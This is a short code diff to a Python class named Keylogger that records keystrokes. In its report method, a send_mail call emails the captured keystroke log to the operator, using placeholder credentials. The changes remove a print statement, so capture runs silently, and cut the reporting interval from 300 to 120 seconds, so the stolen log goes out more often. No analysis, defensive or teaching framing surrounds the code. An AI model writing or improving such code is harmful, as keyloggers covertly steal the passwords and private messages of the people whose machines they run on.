@@ -27,8 +27,7 @@ class Keylogger:
                 self.log_buffer = ""
 
         except Exception:
-            self.log_buffer = self.log_buffer + self.log
-            print(self.log_buffer)
+            self.log_buffer = self.log_buffer + self.log.strip("\n\n")
 
     def process_key(self, key):
         try:
@@ -44,7 +43,7 @@ class Keylogger:
     def report(self):
         self.send_mail("Your email id ", "Your Password ", self.log)
         self.log = "\n\n"
-        timer = threading.Timer(300, self.report)
+        timer = threading.Timer(120, self.report)
         timer.start()
 
     def run(self):
